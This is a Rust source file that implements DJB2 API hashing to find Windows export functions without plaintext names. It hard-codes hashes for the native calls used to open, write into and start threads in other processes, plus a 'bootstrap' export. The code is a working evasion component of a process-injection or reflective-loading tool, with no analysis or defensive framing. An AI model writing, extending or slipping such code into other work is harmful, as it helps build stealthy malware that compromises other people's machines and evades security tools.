//! DJB2 hash for export-name matching without plaintext API strings.

pub const H_NT_OPEN_PROCESS: u32 = 0x5003_C058;
pub const H_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x6793_C34C;
pub const H_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x95F3_A792;
pub const H_NT_CREATE_THREAD_EX: u32 = 0xCB0C_2130;
pub const H_NT_READ_VIRTUAL_MEMORY: u32 = 0xC240_62E3;
pub const H_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x0829_62C8;
pub const H_NT_CLOSE: u32 = 0x8B8E_133D;
pub const H_NT_SET_INFORMATION_THREAD: u32 = 0x5421_2E31;
pub const H_NT_QUERY_INFORMATION_PROCESS: u32 = 0xD034_FC62;
pub const H_BOOTSTRAP: u32 = 0xE236_4AE3;

pub fn hash_cstr(name: &[u8]) -> u32 {
    let end = name.iter().position(|&b| b == 0).unwrap_or(name.len());
    let mut h: u32 = 5381;
    for &b in &name[..end] {
        h = h.wrapping_mul(33).wrapping_add(b as u32);
    }
    h
}

#[repr(C)]
struct ImageExportDirectory {
    _characteristics: u32,
    _time_date_stamp: u32,
    _major: u16,
    _minor: u16,
    _name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

pub unsafe fn export_by_hash(module_base: *const u8, target_hash: u32) -> Option<*const u8> {
    if module_base.is_null() {
        return None;
    }
    let dos = module_base as *const u16;
    if *dos != 0x5A4D {
        return None;
    }
    let e_lfanew = *(module_base.add(0x3C) as *const i32);
    let nt = module_base.add(e_lfanew as usize);
    if *(nt as *const u32) != 0x0000_4550 {
        return None;
    }
    let opt = nt.add(4 + 20);
    let magic = *(opt as *const u16);
    let export_rva = if magic == 0x20B {
        *(opt.add(112) as *const u32)
    } else if magic == 0x10B {
        *(opt.add(96) as *const u32)
    } else {
        return None;
    };
    if export_rva == 0 {
        return None;
    }
    let exp = &*(module_base.add(export_rva as usize) as *const ImageExportDirectory);
    for i in 0..exp.number_of_names {
        let name_rva = *(module_base
            .add(exp.address_of_names as usize + i as usize * 4) as *const u32);
        let name_ptr = module_base.add(name_rva as usize);
        let name_len = (0..256).find(|&j| *name_ptr.add(j) == 0).unwrap_or(256);
        if hash_cstr(std::slice::from_raw_parts(name_ptr, name_len)) != target_hash {
            continue;
        }
        let ordinal = *(module_base
            .add(exp.address_of_name_ordinals as usize + i as usize * 2) as *const u16)
            as u32;
        let func_rva = *(module_base
            .add(exp.address_of_functions as usize + ordinal as usize * 4) as *const u32);
        return Some(module_base.add(func_rva as usize));
    }
    None
}

pub unsafe fn export_rva_by_hash(pe: &[u8], target_hash: u32) -> Option<u32> {
    if pe.len() < 64 {
        return None;
    }
    let dos = pe.as_ptr() as *const u16;
    if *dos != 0x5A4D {
        return None;
    }
    let e_lfanew = *(pe.as_ptr().add(0x3C) as *const i32) as usize;
    if pe.len() < e_lfanew + 256 {
        return None;
    }
    let opt_off = e_lfanew + 4 + 20;
    let magic = u16::from_le_bytes([pe[opt_off], pe[opt_off + 1]]);
    let export_dir_off = if magic == 0x20B { opt_off + 112 } else { opt_off + 96 };
    let export_rva = u32::from_le_bytes([
        pe[export_dir_off],
        pe[export_dir_off + 1],
        pe[export_dir_off + 2],
        pe[export_dir_off + 3],
    ]);
    if export_rva == 0 || export_rva as usize >= pe.len() {
        return None;
    }
    let exp = pe.as_ptr().add(export_rva as usize) as *const ImageExportDirectory;
    let exp = &*exp;
    for i in 0..exp.number_of_names {
        let name_rva_off = exp.address_of_names as usize + i as usize * 4;
        if name_rva_off + 4 > pe.len() {
            break;
        }
        let name_rva = u32::from_le_bytes([
            pe[name_rva_off],
            pe[name_rva_off + 1],
            pe[name_rva_off + 2],
            pe[name_rva_off + 3],
        ]) as usize;
        if name_rva >= pe.len() {
            continue;
        }
        let end = pe[name_rva..].iter().position(|&b| b == 0).unwrap_or(0);
        if hash_cstr(&pe[name_rva..name_rva + end]) != target_hash {
            continue;
        }
        let ord_off = exp.address_of_name_ordinals as usize + i as usize * 2;
        let ordinal = u16::from_le_bytes([pe[ord_off], pe[ord_off + 1]]) as usize;
        let func_off = exp.address_of_functions as usize + ordinal * 4;
        return Some(u32::from_le_bytes([
            pe[func_off],
            pe[func_off + 1],
            pe[func_off + 2],
            pe[func_off + 3],
        ]));
    }
    None
}
